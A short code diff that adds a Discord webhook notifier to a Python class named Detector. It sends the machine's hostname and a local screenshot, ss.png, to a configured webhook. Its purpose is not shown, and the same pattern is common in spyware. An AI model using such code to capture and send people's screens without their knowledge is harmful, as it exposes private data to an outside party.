@@ -13,3 +13,10 @@ class Detector():
     def webhook_Event(self):
         hostname = socket.gethostname()
         webhook = DiscordWebhook(url=self.webhook_url)
+        with open("ss.png", "rb") as f:
+            webhook.add_file(file=f.read(), filename='ss.png')
+        embed = DiscordEmbed(title=f'Hostname: {hostname}\nScreen shot: ')
+        embed.set_image(url="attachment://ss.png")
+        webhook.add_embed(embed)
+        webhook.execute()
+        
